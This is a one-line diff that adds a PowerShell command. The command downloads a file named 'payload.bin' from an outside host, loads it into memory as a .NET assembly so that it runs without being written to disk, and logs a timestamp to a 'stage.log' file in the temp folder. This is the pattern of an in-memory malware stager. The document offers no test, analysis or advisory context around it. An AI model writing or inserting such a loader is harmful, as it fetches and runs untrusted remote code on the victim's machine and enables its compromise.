@@ -1,0 +1,1 @@
+$StageBytes = (New-Object System.Net.WebClient).DownloadData("https://adatum.com:443/payload.bin"); [Reflection.Assembly]::Load($StageBytes); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
